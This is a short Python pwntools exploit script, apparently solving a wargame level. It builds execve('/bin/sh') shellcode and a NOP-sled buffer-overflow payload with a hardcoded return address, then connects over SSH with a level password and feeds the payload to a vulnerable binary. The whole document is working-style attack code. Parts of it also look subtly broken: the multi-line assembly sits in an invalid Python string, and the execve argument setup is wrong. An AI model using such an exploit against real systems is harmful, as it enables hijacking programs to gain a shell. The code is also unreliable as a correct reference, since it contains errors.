from pwn import *

shellcode = asm(
"
_start:
    xor eax, eax        ; set eax to 0
    xor edx, edx        ; set env to NULL
    mov al, 11          ; execve syscall number
    push edx            ; push NULL string terminator
    mov ebx, '//sh'     ; first arg to /sh
    push ebx            ; push to stack
    mov ebx, '/bin'     ; first arg to /bin/sh
    push ebx            ; push to stack
    mov edi, esp        ; move pointer to ['/bin//sh']
    push edx            ; push NULL string terminator
    push ebx            ; push second arg to ['/bin//sh']
    mov ecx, esp        ; pointer to args
    int    0x80         ; syscall
"
)

payload = b'\x90'*33 + bytes(shellcode) + b'\x90'*16 + p32(0xbffff720)


# Change host according to your configuration
s = ssh(
    user="level1",
    host="192.168.56.8",
    password="1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a",
    port=4242
)

p = s.process("/home/user/level1/level1")
p.sendline(payload)
#p.interactive()
p.stream()

p.close()
s.close()
